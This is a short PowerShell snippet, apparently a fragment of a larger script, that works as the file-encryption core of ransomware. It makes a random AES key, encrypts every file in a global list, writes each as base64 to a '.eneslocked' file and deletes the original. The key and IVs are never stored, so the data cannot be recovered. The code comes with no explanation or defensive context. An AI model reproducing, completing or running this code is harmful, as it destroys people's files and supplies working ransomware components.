$key = New-Object byte[] 16; (New-Object Security.Cryptography.RNGCryptoServiceProvider).GetBytes($key)

foreach ($file in $global:files) {
    $content = Get-Content $file.FullName -Raw -ErrorAction SilentlyContinue
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $key
    $aes.GenerateIV()
    $encryptor = $aes.CreateEncryptor()

    $bytes = [System.Text.Encoding]::UTF8.GetBytes($content)
    $cipher = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)

    Set-Content "$($file.FullName).eneslocked" -Value ([System.Convert]::ToBase64String($cipher))
    Remove-Item $file.FullName
}

